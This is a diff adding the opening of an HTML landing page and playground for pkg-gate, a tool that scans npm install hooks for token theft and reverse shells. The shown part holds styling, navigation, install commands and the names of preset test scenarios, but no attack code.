@@ -1,0 +1,2156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>pkg-gate Playground - Pre-install Security Gate for npm</title>
+  <meta name="description" content="Interactive playground for pkg-gate: pre-install security gate for npm lifecycle scripts using TypeSafe System One. Test packages, scripts, and policies with calibrated AI evaluation.">
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  
+  <style>
+    /* ==========================================================================
+       PASTEL THEME & TASTE DESIGN TOKENS
+       Inspired by tasteskill.dev and impeccable design principles.
+       Zero em-dashes or en-dashes. High contrast text on soft pastel surfaces.
+       ========================================================================== */
+    :root {
+      --font-sans: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      --font-mono: 'Geist Mono', 'SF Mono', 'JetBrains Mono', monospace;
+
+      /* Pastel Palette */
+      --canvas-bg: #f8f7f4;
+      --card-bg: #ffffff;
+      --card-border: #e8e6df;
+      --text-main: #14171a;
+      --text-muted: #5e6672;
+      --text-subtle: #8993a4;
+
+      /* Pastel Allow (Mint / Sage) */
+      --pastel-allow-bg: #edf7f2;
+      --pastel-allow-border: #c2e2d0;
+      --pastel-allow-text: #175432;
+      --pastel-allow-badge-bg: #d7efe1;
+      --pastel-allow-accent: #2e7d32;
+
+      /* Pastel Warn (Buttercup / Honey Peach) */
+      --pastel-warn-bg: #fef7ec;
+      --pastel-warn-border: #f8dfbe;
+      --pastel-warn-text: #8c4c00;
+      --pastel-warn-badge-bg: #faebd2;
+      --pastel-warn-accent: #d97706;
+
+      /* Pastel Block (Blush Coral / Soft Rose) */
+      --pastel-block-bg: #fdf1f0;
+      --pastel-block-border: #fac9c5;
+      --pastel-block-text: #9b201a;
+      --pastel-block-badge-bg: #f8d7d4;
+      --pastel-block-accent: #dc2626;
+
+      /* Pastel Neutral Accent (Lavender / Periwinkle) */
+      --pastel-neutral-bg: #f3f4fa;
+      --pastel-neutral-border: #dadceb;
+      --pastel-neutral-text: #374151;
+
+      /* Pastel Cyan / Glacier */
+      --pastel-sky-bg: #eef6fc;
+      --pastel-sky-border: #cde2f5;
+      --pastel-sky-text: #075985;
+
+      /* Corner Radii System (Shape Consistency Lock) */
+      --radius-sm: 8px;
+      --radius-md: 14px;
+      --radius-lg: 20px;
+      --radius-xl: 26px;
+      --radius-full: 9999px;
+
+      --shadow-sm: 0 1px 2px rgba(15, 23, 42, 0.04);
+      --shadow-card: 0 6px 20px -6px rgba(15, 23, 42, 0.06), 0 1px 3px rgba(15, 23, 42, 0.03);
+      --shadow-hover: 0 14px 32px -8px rgba(15, 23, 42, 0.1), 0 2px 4px rgba(15, 23, 42, 0.03);
+      --shadow-pill: 0 4px 14px -3px rgba(15, 23, 42, 0.08);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--canvas-bg);
+      color: var(--text-main);
+      font-family: var(--font-sans);
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
+      overflow-x: hidden;
+      min-height: 100vh;
+    }
+
+    /* Subtle fine-grain texture overlay */
+    .noise-bg {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 9999;
+      opacity: 0.025;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
+    }
+
+    /* ==========================================================================
+       TOP NAVIGATION BAR
+       ========================================================================== */
+    .top-nav {
+      position: sticky;
+      top: 12px;
+      z-index: 100;
+      max-width: 1240px;
+      margin: 0 auto;
+      padding: 0 16px;
+    }
+
+    .nav-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      background: rgba(255, 255, 255, 0.88);
+      backdrop-filter: blur(14px);
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-full);
+      padding: 8px 16px;
+      box-shadow: var(--shadow-sm);
+    }
+
+    .brand-link {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+      color: var(--text-main);
+      font-weight: 700;
+      font-size: 16px;
+      letter-spacing: -0.02em;
+    }
+
+    .brand-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 28px;
+      height: 28px;
+      background: #151515;
+      color: #ffffff;
+      border-radius: var(--radius-sm);
+      font-family: var(--font-mono);
+      font-size: 13px;
+      font-weight: 700;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+    }
+
+    .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .nav-link {
+      text-decoration: none;
+      color: var(--text-muted);
+      font-size: 13px;
+      font-weight: 500;
+      padding: 6px 14px;
+      border-radius: var(--radius-full);
+      transition: all 0.2s ease;
+    }
+
+    .nav-link:hover {
+      color: var(--text-main);
+      background: var(--pastel-neutral-bg);
+    }
+
+    .nav-btn-gh {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #18181b;
+      color: #ffffff;
+      text-decoration: none;
+      font-size: 12px;
+      font-weight: 600;
+      padding: 6px 14px;
+      border-radius: var(--radius-full);
+      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.12);
+    }
+
+    .nav-btn-gh:hover {
+      background: #27272a;
+      transform: translateY(-1px);
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.18);
+    }
+
+    /* ==========================================================================
+       HERO SECTION (Strict Hero Discipline)
+       Desktop headline <= 2 lines. Subtext <= 20 words. CTA above the fold.
+       ========================================================================== */
+    .hero-section {
+      max-width: 1240px;
+      margin: 36px auto 28px;
+      padding: 0 20px;
+      text-align: center;
+    }
+
+    .hero-eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: var(--pastel-warn-bg);
+      border: 1px solid var(--pastel-warn-border);
+      color: var(--pastel-warn-text);
+      font-size: 12px;
+      font-weight: 600;
+      padding: 5px 14px;
+      border-radius: var(--radius-full);
+      margin-bottom: 16px;
+    }
+
+    .hero-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--pastel-warn-accent);
+      box-shadow: 0 0 0 2px rgba(217, 119, 6, 0.2);
+    }
+
+    .hero-title {
+      font-size: clamp(32px, 5vw, 54px);
+      font-weight: 700;
+      line-height: 1.1;
+      letter-spacing: -0.035em;
+      color: var(--text-main);
+      max-width: 820px;
+      margin: 0 auto 14px;
+    }
+
+    .hero-title span {
+      color: #059669;
+      background: linear-gradient(180deg, #10b981 0%, #059669 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .hero-subtitle {
+      font-size: clamp(16px, 2vw, 18px);
+      color: var(--text-muted);
+      max-width: 640px;
+      margin: 0 auto 24px;
+      line-height: 1.45;
+      letter-spacing: -0.01em;
+    }
+
+    .quick-cli-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+      margin-bottom: 24px;
+    }
+
+    .cli-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-full);
+      padding: 7px 16px;
+      font-family: var(--font-mono);
+      font-size: 13px;
+      color: var(--text-main);
+      box-shadow: var(--shadow-sm);
+    }
+
+    .cli-pill code {
+      color: #0f172a;
+      font-weight: 600;
+    }
+
+    .copy-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: var(--text-subtle);
+      display: flex;
+      align-items: center;
+      padding: 4px;
+      border-radius: var(--radius-sm);
+      transition: all 0.2s ease;
+    }
+
+    .copy-btn:hover {
+      color: var(--text-main);
+      background: var(--pastel-neutral-bg);
+    }
+
+    /* Preset Selection Bar */
+    .presets-container {
+      max-width: 1000px;
+      margin: 0 auto 36px;
+      text-align: center;
+    }
+
+    .presets-label {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-subtle);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 10px;
+    }
+
+    .preset-pills-wrap {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+
+    .preset-btn {
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-full);
+      padding: 6px 14px;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-main);
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+      box-shadow: var(--shadow-sm);
+    }
+
+    .preset-btn:hover {
+      border-color: #cbd5e1;
+      transform: translateY(-1px);
+      box-shadow: var(--shadow-pill);
+    }
+
+    .preset-btn.active {
+      border-color: #111827;
+      background: #18181b;
+      color: #ffffff;
+    }
+
+    .preset-tag {
+      font-size: 10px;
+      font-weight: 700;
+      padding: 2px 6px;
+      border-radius: 4px;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+
+    .preset-tag.block {
+      background: var(--pastel-block-badge-bg);
+      color: var(--pastel-block-text);
+    }
+    .preset-tag.warn {
+      background: var(--pastel-warn-badge-bg);
+      color: var(--pastel-warn-text);
+    }
+    .preset-tag.allow {
+      background: var(--pastel-allow-badge-bg);
+      color: var(--pastel-allow-text);
+    }
+
+    /* ==========================================================================
+       MAIN WORKBENCH LAYOUT (Asymmetrical 2-Column Split)
+       ========================================================================== */
+    .workbench-grid {
+      max-width: 1240px;
+      margin: 0 auto 50px;
+      padding: 0 20px;
+      display: grid;
+      grid-template-columns: minmax(360px, 480px) minmax(0, 1fr);
+      gap: 24px;
+      align-items: start;
+    }
+
+    @media (max-width: 960px) {
+      .workbench-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-lg);
+      padding: 24px;
+      box-shadow: var(--shadow-card);
+      position: relative;
+    }
+
+    .card-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 18px;
+    }
+
+    .card-title {
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: -0.01em;
+      color: var(--text-main);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    /* Tabs Bar */
+    .tab-bar {
+      display: flex;
+      background: var(--pastel-neutral-bg);
+      border-radius: var(--radius-full);
+      padding: 4px;
+      gap: 4px;
+      margin-bottom: 18px;
+    }
+
+    .tab-btn {
+      flex: 1;
+      border: none;
+      background: transparent;
+      padding: 8px 12px;
+      border-radius: var(--radius-full);
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-muted);
+      cursor: pointer;
+      transition: all 0.2s ease;
+      text-align: center;
+      white-space: nowrap;
+    }
+
+    .tab-btn.active {
+      background: #ffffff;
+      color: var(--text-main);
+      box-shadow: 0 2px 6px rgba(15, 23, 42, 0.06);
+    }
+
+    /* Input Fields */
+    .input-group {
+      margin-bottom: 16px;
+    }
+
+    .input-label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-muted);
+      margin-bottom: 6px;
+    }
+
+    .text-input {
+      width: 100%;
+      padding: 10px 14px;
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-md);
+      font-family: var(--font-mono);
+      font-size: 13px;
+      color: var(--text-main);
+      outline: none;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .text-input:focus {
+      border-color: #0f172a;
+      box-shadow: 0 0 0 3px rgba(15, 23, 42, 0.05);
+    }
+
+    .code-textarea {
+      width: 100%;
+      height: 180px;
+      padding: 12px 14px;
+      background: #fafaf9;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-md);
+      font-family: var(--font-mono);
+      font-size: 12px;
+      color: #1e293b;
+      line-height: 1.5;
+      resize: vertical;
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    .code-textarea:focus {
+      border-color: #0f172a;
+    }
+
+    /* Engine Options Accordion */
+    .engine-section {
+      margin-top: 18px;
+      padding-top: 16px;
+      border-top: 1px solid #f1f0eb;
+    }
+
+    .engine-toggle-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    .engine-label {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-main);
+    }
+
+    .engine-desc {
+      font-size: 11px;
+      color: var(--text-subtle);
+    }
+
+    .toggle-switch {
+      display: inline-flex;
+      background: var(--pastel-neutral-bg);
+      border-radius: var(--radius-full);
+      padding: 3px;
+      cursor: pointer;
+    }
+
+    .toggle-opt {
+      padding: 4px 10px;
+      border-radius: var(--radius-full);
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--text-muted);
+      border: none;
+      background: none;
+      cursor: pointer;
+    }
+
+    .toggle-opt.active {
+      background: #ffffff;
+      color: var(--text-main);
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
+    }
+
+    .api-key-wrap {
+      display: none;
+      margin-top: 10px;
+    }
+
+    .api-key-wrap.visible {
+      display: block;
+    }
+
+    /* Action Buttons */
+    .eval-btn {
+      width: 100%;
+      background: #111827;
+      color: #ffffff;
+      border: none;
+      border-radius: var(--radius-md);
+      padding: 12px 18px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+      box-shadow: 0 6px 18px rgba(17, 24, 39, 0.15);
+      margin-top: 16px;
+    }
+
+    .eval-btn:hover {
+      background: #1f2937;
+      transform: translateY(-1px);
+      box-shadow: 0 10px 24px rgba(17, 24, 39, 0.22);
+    }
+
+    .eval-btn:active {
+      transform: scale(0.985);
+    }
+
+    /* ==========================================================================
+       RIGHT PANEL: VERDICT & INSPECTION CARD
+       ========================================================================== */
+    .verdict-banner {
+      border-radius: var(--radius-lg);
+      padding: 24px;
+      border: 1px solid var(--card-border);
+      transition: background 0.3s ease, border-color 0.3s ease;
+      margin-bottom: 24px;
+    }
+
+    .verdict-banner.allow {
+      background: var(--pastel-allow-bg);
+      border-color: var(--pastel-allow-border);
+    }
+
+    .verdict-banner.warn {
+      background: var(--pastel-warn-bg);
+      border-color: var(--pastel-warn-border);
+    }
+
+    .verdict-banner.block {
+      background: var(--pastel-block-bg);
+      border-color: var(--pastel-block-border);
+    }
+
+    .verdict-top {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 16px;
+      margin-bottom: 14px;
+      flex-wrap: wrap;
+    }
+
+    .verdict-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-family: var(--font-mono);
+      font-size: 14px;
+      font-weight: 700;
+      padding: 6px 14px;
+      border-radius: var(--radius-full);
+      letter-spacing: 0.04em;
+    }
+
+    .verdict-banner.allow .verdict-badge {
+      background: var(--pastel-allow-badge-bg);
+      color: var(--pastel-allow-text);
+    }
+
+    .verdict-banner.warn .verdict-badge {
+      background: var(--pastel-warn-badge-bg);
+      color: var(--pastel-warn-text);
+    }
+
+    .verdict-banner.block .verdict-badge {
+      background: var(--pastel-block-badge-bg);
+      color: var(--pastel-block-text);
+    }
+
+    .target-meta {
+      font-family: var(--font-mono);
+      font-size: 13px;
+      color: var(--text-muted);
+      font-weight: 600;
+    }
+
+    .verdict-headline {
+      font-size: 20px;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      margin-bottom: 6px;
+    }
+
+    .verdict-banner.allow .verdict-headline {
+      color: var(--pastel-allow-text);
+    }
+    .verdict-banner.warn .verdict-headline {
+      color: var(--pastel-warn-text);
+    }
+    .verdict-banner.block .verdict-headline {
+      color: var(--pastel-block-text);
+    }
+
+    .verdict-summary {
+      font-size: 14px;
+      color: var(--text-main);
+      line-height: 1.45;
+    }
+
+    /* Metric Tiles Row (Asymmetric 4 items) */
+    .metrics-row {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+      margin-top: 18px;
+    }
+
+    @media (max-width: 640px) {
+      .metrics-row {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+
+    .metric-tile {
+      background: rgba(255, 255, 255, 0.7);
+      backdrop-filter: blur(8px);
+      border: 1px solid rgba(0, 0, 0, 0.05);
+      border-radius: var(--radius-md);
+      padding: 10px 12px;
+    }
+
+    .metric-name {
+      font-size: 10px;
+      font-weight: 600;
+      color: var(--text-subtle);
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-bottom: 4px;
+    }
+
+    .metric-val {
+      font-family: var(--font-mono);
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--text-main);
+    }
+
+    .metric-sub {
+      font-size: 10px;
+      color: var(--text-muted);
+      margin-top: 2px;
+    }
+
+    /* Findings List */
+    .findings-section {
+      margin-bottom: 24px;
+    }
+
+    .section-subhead {
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--text-main);
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .finding-card {
+      background: #fafaf9;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-md);
+      padding: 16px;
+      margin-bottom: 14px;
+    }
+
+    .finding-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 10px;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+
+    .hook-badge {
+      display: inline-block;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 8px;
+      border-radius: 4px;
+      background: #18181b;
+      color: #ffffff;
+    }
+
+    .command-box {
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-sm);
+      padding: 8px 12px;
+      font-family: var(--font-mono);
+      font-size: 12px;
+      color: #0f172a;
+      overflow-x: auto;
+      margin-bottom: 14px;
+      word-break: break-all;
+    }
+
+    /* Gauge Meters */
+    .gauges-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+      margin-bottom: 12px;
+    }
+
+    @media (max-width: 540px) {
+      .gauges-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .gauge-box {
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-sm);
+      padding: 10px 12px;
+    }
+
+    .gauge-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--text-muted);
+      margin-bottom: 6px;
+    }
+
+    .gauge-pct {
+      font-family: var(--font-mono);
+      font-weight: 700;
+      color: var(--text-main);
+    }
+
+    .progress-track {
+      height: 6px;
+      background: #f1f0ea;
+      border-radius: var(--radius-full);
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      border-radius: var(--radius-full);
+      transition: width 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    .progress-fill.safe {
+      background: #10b981;
+    }
+    .progress-fill.warn {
+      background: #f59e0b;
+    }
+    .progress-fill.danger {
+      background: #ef4444;
+    }
+
+    /* Reasons List */
+    .reasons-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      margin-top: 10px;
+    }
+
+    .reason-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      font-size: 12px;
+      color: var(--text-main);
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-sm);
+      padding: 8px 12px;
+    }
+
+    .reason-icon {
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    /* Bottom Inspector Tabs (Structured JSON & CLI Command) */
+    .inspector-card {
+      margin-top: 24px;
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-md);
+      overflow: hidden;
+    }
+
+    .inspector-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 16px;
+      background: #fafaf9;
+      border-bottom: 1px solid var(--card-border);
+    }
+
+    .inspector-title {
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--text-muted);
+      font-family: var(--font-mono);
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+    }
+
+    .json-code-box {
+      max-height: 220px;
+      overflow-y: auto;
+      padding: 14px;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      color: #1e293b;
+      line-height: 1.45;
+      background: #fdfdfd;
+    }
+
+    /* ==========================================================================
+       ARCHITECTURE FLOW SECTION
+       ========================================================================== */
+    .flow-section {
+      max-width: 1240px;
+      margin: 40px auto 60px;
+      padding: 0 20px;
+    }
+
+    .flow-card {
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-xl);
+      padding: 32px;
+      box-shadow: var(--shadow-card);
+    }
+
+    .flow-card-header {
+      display: flex;
+      align-items: flex-end;
+      justify-content: space-between;
+      gap: 20px;
+      margin-bottom: 24px;
+      flex-wrap: wrap;
+    }
+
+    .flow-heading {
+      font-size: 24px;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      color: var(--text-main);
+    }
+
+    .flow-desc {
+      font-size: 14px;
+      color: var(--text-muted);
+      max-width: 600px;
+      margin-top: 4px;
+    }
+
+    .svg-container {
+      width: 100%;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      background: #ffffff;
+      box-shadow: var(--shadow-sm);
+    }
+
+    .svg-container img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    /* ==========================================================================
+       HOW IT WORKS GRID (Asymmetrical anti-slop cards)
+       ========================================================================== */
+    .principles-section {
+      max-width: 1240px;
+      margin: 0 auto 60px;
+      padding: 0 20px;
+    }
+
+    .principles-grid {
+      display: grid;
+      grid-template-columns: 1.2fr 1fr;
+      gap: 20px;
+    }
+
+    @media (max-width: 860px) {
+      .principles-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .principle-box {
+      background: #ffffff;
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-lg);
+      padding: 24px;
+      box-shadow: var(--shadow-sm);
+    }
+
+    .principle-tag {
+      display: inline-block;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      padding: 4px 10px;
+      border-radius: var(--radius-full);
+      margin-bottom: 12px;
+    }
+
+    .principle-tag.sage {
+      background: var(--pastel-allow-badge-bg);
+      color: var(--pastel-allow-text);
+    }
+
+    .principle-tag.honey {
+      background: var(--pastel-warn-badge-bg);
+      color: var(--pastel-warn-text);
+    }
+
+    .principle-tag.lavender {
+      background: var(--pastel-neutral-bg);
+      color: var(--pastel-neutral-text);
+    }
+
+    .principle-title {
+      font-size: 18px;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      margin-bottom: 8px;
+    }
+
+    .principle-text {
+      font-size: 14px;
+      color: var(--text-muted);
+      line-height: 1.5;
+    }
+
+    /* ==========================================================================
+       FOOTER
+       ========================================================================== */
+    .site-footer {
+      max-width: 1240px;
+      margin: 0 auto;
+      padding: 36px 20px 48px;
+      border-top: 1px solid var(--card-border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 16px;
+      font-size: 13px;
+      color: var(--text-muted);
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 16px;
+    }
+
+    .footer-link {
+      color: var(--text-muted);
+      text-decoration: none;
+      transition: color 0.2s ease;
+    }
+
+    .footer-link:hover {
+      color: var(--text-main);
+    }
+
+    /* Toast notification */
+    .toast {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      background: #111827;
+      color: #ffffff;
+      font-size: 12px;
+      font-weight: 600;
+      padding: 10px 18px;
+      border-radius: var(--radius-full);
+      box-shadow: var(--shadow-hover);
+      transform: translateY(60px);
+      opacity: 0;
+      transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+      z-index: 99999;
+      pointer-events: none;
+    }
+
+    .toast.show {
+      transform: translateY(0);
+      opacity: 1;
+    }
+  </style>
+</head>
+<body>
+  <div class="noise-bg" aria-hidden="true"></div>
+
+  <!-- TOP NAVIGATION BAR -->
+  <header class="top-nav">
+    <nav class="nav-inner">
+      <a href="#" class="brand-link" aria-label="pkg-gate home">
+        <span class="brand-badge">pg</span>
+        <span>pkg-gate</span>
+      </a>
+      <div class="nav-links">
+        <a href="#playground" class="nav-link">Playground</a>
+        <a href="#flow" class="nav-link">Architecture</a>
+        <a href="#principles" class="nav-link">How It Works</a>
+        <a href="https://github.com/hemanth/pkg-gate" target="_blank" rel="noopener noreferrer" class="nav-btn-gh">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+          <span>GitHub</span>
+        </a>
+      </div>
+    </nav>
+  </header>
+
+  <!-- HERO SECTION (Strict Hero Discipline: max 2 lines, concise text, CTA above fold) -->
+  <main>
+    <section class="hero-section">
+      <div class="hero-eyebrow">
+        <span class="hero-dot"></span>
+        <span>TypeSafe System One Powered Security Gate</span>
+      </div>
+      <h1 class="hero-title">
+        Pre-install security gate for <span>npm lifecycle scripts</span>.
+      </h1>
+      <p class="hero-subtitle">
+        Inspect install hooks, detect token theft and reverse shells, and enforce confidence-gated policy routing before code executes.
+      </p>
+
+      <!-- Quick CLI install bar -->
+      <div class="quick-cli-row">
+        <div class="cli-pill">
+          <span>$</span>
+          <code id="cli-cmd">npx pkg-gate esbuild</code>
+          <button class="copy-btn" id="copy-cli-btn" title="Copy CLI command" aria-label="Copy CLI command">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+          </button>
+        </div>
+        <div class="cli-pill">
+          <span>$</span>
+          <code>npm install pkg-gate</code>
+          <button class="copy-btn" onclick="copyText('npm install pkg-gate')" title="Copy install command" aria-label="Copy install command">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+          </button>
+        </div>
+      </div>
+
+      <!-- Presets Pill Selector -->
+      <div class="presets-container">
+        <p class="presets-label">Select a curated scenario to evaluate</p>
+        <div class="preset-pills-wrap">
+          <button class="preset-btn active" data-preset="credential-theft">
+            <span>Token Exfiltration</span>
+            <span class="preset-tag block">Block</span>
+          </button>
+          <button class="preset-btn" data-preset="reverse-shell">
+            <span>Reverse Shell Dropper</span>
+            <span class="preset-tag block">Block</span>
+          </button>
+          <button class="preset-btn" data-preset="recon-probe">
+            <span>System Recon</span>
+            <span class="preset-tag warn">Warn</span>
+          </button>
+          <button class="preset-btn" data-preset="binary-download">
+            <span>Binary Downloader</span>
+            <span class="preset-tag allow">Allow</span>
+          </button>
+          <button class="preset-btn" data-preset="native-build">
+            <span>Native C++ Build</span>
+            <span class="preset-tag allow">Allow</span>
+          </button>
+          <button class="preset-btn" data-preset="clean-pkg">
+            <span>Clean Utility</span>
+            <span class="preset-tag allow">Allow</span>
+          </button>
+        </div>
+      </div>
+    </section>
+
+    <!-- INTERACTIVE WORKBENCH (Asymmetrical 2-Column Split) -->
+    <section class="workbench-grid" id="playground">
+      
+      <!-- LEFT COLUMN: INPUT CONTROLS -->
+      <div class="card">
+        <div class="card-header">
+          <h2 class="card-title">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg>
+            <span>Target Input</span>
+          </h2>
